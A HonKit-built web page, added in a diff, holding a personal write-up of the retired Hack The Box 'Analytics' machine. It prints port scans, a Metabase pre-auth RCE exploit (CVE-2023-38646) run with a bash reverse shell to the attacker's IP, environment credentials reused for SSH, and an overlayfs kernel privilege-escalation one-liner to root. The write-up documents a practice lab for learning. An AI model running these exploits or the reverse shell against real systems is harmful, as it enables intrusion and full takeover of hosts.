@@ -1,0 +1,741 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <title>Analytics - Linux Easy · HonKit</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="HonKit 6.1.6">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/@honkit/honkit-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/@honkit/honkit-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+        <link rel="stylesheet" href="../../../../styles/website.css">
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../../../pwn/ret2win.html" />
+    
+    
+    <link rel="prev" href="../drive.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book honkit-cloak">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../../">
+            
+                <a href="../../../../">
+            
+                    
+                    Home
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">👋 About Me</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../../../../about/">
+            
+                <a href="../../../../about/">
+            
+                    
+                    Who Am I?
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">🧠 CTF Writeups</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    HTB
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" >
+            
+                <span>
+            
+                    
+                    🖳 Machines
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1.1" data-path="../drive.html">
+            
+                <a href="../drive.html">
+            
+                    
+                    Drive – Linux Easy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="3.2.1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Analytics - Linux Easy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.1.3" data-path="../../../pwn/ret2win.html">
+            
+                <a href="../../../pwn/ret2win.html">
+            
+                    
+                    ret2win – ExampleCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" >
+            
+                <span>
+            
+                    
+                    🔐 Challenges
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.2.1" data-path="../../../crypto/xor-madness.html">
+            
+                <a href="../../../crypto/xor-madness.html">
+            
+                    
+                    XOR Madness – CryptoCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.3" >
+            
+                <span>
+            
+                    
+                    🕵🏻 Sherlocks
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.3.1" data-path="../../../web/jwt-abuse.html">
+            
+                <a href="../../../web/jwt-abuse.html">
+            
+                    
+                    JWT Abuse – WebCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" >
+            
+                <span>
+            
+                    
+                    THM
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.3.1" >
+            
+                <span>
+            
+                    
+                    🖳 Machines
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.4" >
+            
+                <span>
+            
+                    
+                    CTF's
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.4.1" >
+            
+                <span>
+            
+                    
+                    Challenge Solves
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">🛠 Resources</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="../../../../resources/tools.html">
+            
+                <a href="../../../../resources/tools.html">
+            
+                    
+                    Tools I Use
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
+            Published with HonKit
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../../.." >Analytics - Linux Easy</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="analytics">Analytics.</h1>
+<h2 id="difficulty-easy">Difficulty: EASY</h2>
+<h2 id="os-linux">OS: Linux</h2>
+<h3 id="enumeration">Enumeration:</h3>
+<p>Start with Rustscan and then nmap on the open ports.</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/analytics master ⚡
+$ rustscan 10.10.11.233 --<span class="hljs-built_in">ulimit</span> 5000                                                                                                       [3:52:04]
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-<span class="hljs-string">' `-'</span>`-----<span class="hljs-string">'`----'</span>  `-<span class="hljs-string">'  `----'</span>  `---<span class="hljs-string">' `-'</span>  `-<span class="hljs-string">'`-'</span> `-<span class="hljs-string">'
+Faster Nmap scanning with Rust.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+🌍HACK THE PLANET🌍
+
+[~] The config file is expected to be at "/home/m0j0/.config/rustscan/config.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.10.11.233:22
+Open 10.10.11.233:80
+[~] Starting Nmap
+[&gt;] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.233
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-20 03:54 BST
+Initiating Ping Scan at 03:54
+Scanning 10.10.11.233 [2 ports]
+Completed Ping Scan at 03:54, 0.02s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 03:54
+Completed Parallel DNS resolution of 1 host. at 03:54, 0.02s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 03:54
+Scanning 10.10.11.233 [2 ports]
+Discovered open port 80/tcp on 10.10.11.233
+Discovered open port 22/tcp on 10.10.11.233
+Completed Connect Scan at 03:54, 0.02s elapsed (2 total ports)
+Nmap scan report for 10.10.11.233
+Host is up, received syn-ack (0.020s latency).
+Scanned at 2023-10-20 03:54:09 BST for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
+
+m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/analytics master ⚡
+$ nmap -p 22,80 -sCV 10.10.11.233                                                                                                           [3:54:09]
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-20 03:54 BST
+Nmap scan report for 10.10.11.233
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://analytical.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
+</span></code></pre>
+<p><strong>nmap</strong>:</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/analytics master ⚡
+$ nmap -p 22,80 -sCV 10.10.11.233                                                                                                           [3:54:09]
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-20 03:54 BST
+Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.233
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://analytical.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.16 seconds
+</code></pre>
+<p>Ports 22,80 open. I get a domain and a redirect to analytical.htb so will add to hosts file:</p>
+<p><code>sudo echo .10.10.11.233 analytical.htb &gt;&gt; /etc/hosts</code></p>
+<p>The url takes me to:</p>
+<p><img src="images/Untitled.png" alt="Untitled"></img></p>
+<p>Potential usernames but I need to enumerate more. Firstly I went to login and got a url in my address bar of a subdomain <code>data.analytical.htb</code>. Visiting it I get Metabase login:</p>
+<p><img src="images/Untitled2.png" alt="Untitled"></img></p>
+<p>Reading about MetaBase I found this article <a href="https://github.com/m3m0o/metabase-pre-auth-rce-poc" target="_blank">https://github.com/m3m0o/metabase-pre-auth-rce-poc</a> which talks about a session cookie which I can retrieve:</p>
+<p><code>session-token = "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"</code></p>
+<p>Now to read more about how to use it to abuse the login. This CVE-2023-38646 <a href="https://github.com/m3m0o/metabase-pre-auth-rce-poc" target="_blank">https://github.com/m3m0o/metabase-pre-auth-rce-poc</a> has a python script it looks like I can use for a shell 🙂</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/analytics/metabase-pre-auth-rce-poc main
+$ python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c <span class="hljs-string">"bash -i &gt;&amp; /dev/tcp/10.10.14.17/1234 0&gt;&amp;1"</span>      [4:37:25]
+[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]
+
+[+] Initialized script
+[+] Encoding <span class="hljs-built_in">command</span>
+[+] Making request
+[+] Payload sent
+</code></pre>
+<p><strong>Shell</strong></p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/analytics/metabase-pre-auth-rce-poc main
+$ rlwrap nc -nlvp 1234                                                                                                                      [4:36:11]
+Listening on 0.0.0.0 1234
+<span class="hljs-built_in">ls</span>
+Connection received on 10.10.11.233 54914
+bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Not a <span class="hljs-built_in">tty</span>
+bash: no job control <span class="hljs-keyword">in</span> this shell
+a01b8cd25cb0:/$
+</code></pre>
+<p>Now to break out of the container.  Linpeas did not show much but I wonder what the environment is like, let me check:</p>
+<pre><code class="lang-bash"><span class="hljs-built_in">printenv</span>
+SHELL=/bin/sh
+MB_DB_PASS=
+HOSTNAME=a01b8cd25cb0
+LANGUAGE=en_US:en
+MB_JETTY_HOST=0.0.0.0
+JAVA_HOME=/opt/java/openjdk
+MB_DB_FILE=//metabase.db/metabase.db
+PWD=/
+LOGNAME=metabase
+MB_EMAIL_SMTP_USERNAME=
+HOME=/home/metabase
+LANG=en_US.UTF-8
+META_USER=metalytics
+META_PASS=An4lytics_ds20223#
+MB_EMAIL_SMTP_PASSWORD=
+USER=metabase
+SHLVL=4
+MB_DB_USER=
+FC_LANG=en-US
+LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
+LC_CTYPE=en_US.UTF-8
+MB_LDAP_BIND_DN=
+LC_ALL=en_US.UTF-8
+MB_LDAP_PASSWORD=
+PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MB_DB_CONNECTION_URI=
+JAVA_VERSION=jdk-11.0.19+7
+_=/bin/printenv
+</code></pre>
+<p>And it looks like creds. I wonder have they been re-used let me try ssh:</p>
+<p>Boom 😀</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/analytics master ⚡
+$ ssh metalytics@10.10.11.233                                         [4:43:42]
+metalytics@10.10.11.233<span class="hljs-string">'s password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Oct 20 03:44:13 AM UTC 2023
+
+  System load:              0.0732421875
+  Usage of /:               94.8% of 7.78GB
+  Memory usage:             30%
+  Swap usage:               0%
+  Processes:                155
+  Users logged in:          0
+  IPv4 address for docker0: 172.17.0.1
+  IPv4 address for eth0:    10.10.11.233
+  IPv6 address for eth0:    dead:beef::250:56ff:feb9:8f4a
+
+  =&gt; / is using 94.8% of 7.78GB
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Oct 19 22:57:37 2023 from 10.10.14.24
+metalytics@analytics:~$ id
+uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
+</span></code></pre>
+<p>User is got 🙂</p>
+<pre><code class="lang-bash">metalytics@analytics:~$ <span class="hljs-built_in">cat</span> user.txt 
+1c5f4d6127f570eb24e7e75886b96fec
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation:</h2>
+<p>Linpeas is not giving away too much so I will manually enumerate but first let me try  </p>
+<p><a href="https://www.kali.org/tools/linux-exploit-suggester/" target="_blank">https://www.kali.org/tools/linux-exploit-suggester/</a></p>
+<p>And it gives some info on the kernel etc:</p>
+<pre><code class="lang-bash">Kernel version: 6.2.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 22.04
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+</code></pre>
+<p>I am on Ubuntu and I read about kernel exploits recently, let me try and find interesting articles or PoC’s like this </p>
+<p><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" target="_blank">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a></p>
+<pre><code class="lang-bash">metalytics@analytics:/tmp$ unshare -<span class="hljs-built_in">rm</span> sh -c <span class="hljs-string">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;"</span> &amp;&amp; u/python3 -c <span class="hljs-string">'import os;os.setuid(0);os.system("bash")'</span>
+root@analytics:/tmp# <span class="hljs-built_in">cat</span> /root/root.txt
+9218fd81f31cd308b6214b43c9820dfe
+</code></pre>
+<p>I got root, That was easy :)</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../drive.html" class="navigation navigation-prev " aria-label="Previous page: Drive – Linux Easy">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../../../pwn/ret2win.html" class="navigation navigation-next " aria-label="Next page: ret2win – ExampleCTF">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Analytics - Linux Easy","level":"3.2.1.2","depth":3,"next":{"title":"ret2win – ExampleCTF","level":"3.2.1.3","depth":3,"path":"writeups/pwn/ret2win.md","ref":"writeups/pwn/ret2win.md","articles":[]},"previous":{"title":"Drive – Linux Easy","level":"3.2.1.1","depth":3,"path":"writeups/linux/easy/drive.md","ref":"writeups/linux/easy/drive.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"writeups/linux/easy/analytics/README.md","mtime":"2026-02-26T05:19:52.473Z","type":"markdown"},"gitbook":{"version":"6.1.6","time":"2026-02-26T05:24:12.845Z"},"basePath":"../../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <noscript>
+        <style>
+            .honkit-cloak {
+                display: block !important;
+            }
+        </style>
+    </noscript>
+    <script>
+        // Restore sidebar state as critical path for prevent layout shift
+        function __init__getSidebarState(defaultValue){
+            var baseKey = "";
+            var key = baseKey + ":sidebar";
+            try {
+                var value = localStorage[key];
+                if (value === undefined) {
+                    return defaultValue;
+                }
+                var parsed = JSON.parse(value);
+                return parsed == null ? defaultValue : parsed;
+            } catch (e) {
+                return defaultValue;
+            }
+        }
+        function __init__restoreLastSidebarState() {
+            var isMobile = window.matchMedia("(max-width: 600px)").matches;
+            if (isMobile) {
+                // Init last state if not mobile
+                return;
+            }
+            var sidebarState = __init__getSidebarState(true);
+            var book = document.querySelector(".book");
+            // Show sidebar if it enabled
+            if (sidebarState && book) {
+                book.classList.add("without-animation", "with-summary");
+            }
+        }
+
+        try {
+            __init__restoreLastSidebarState();
+        } finally {
+            var book = document.querySelector(".book");
+            book.classList.remove("honkit-cloak");
+        }
+    </script>
+    <script src="../../../../gitbook/gitbook.js"></script>
+    <script src="../../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/@honkit/honkit-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
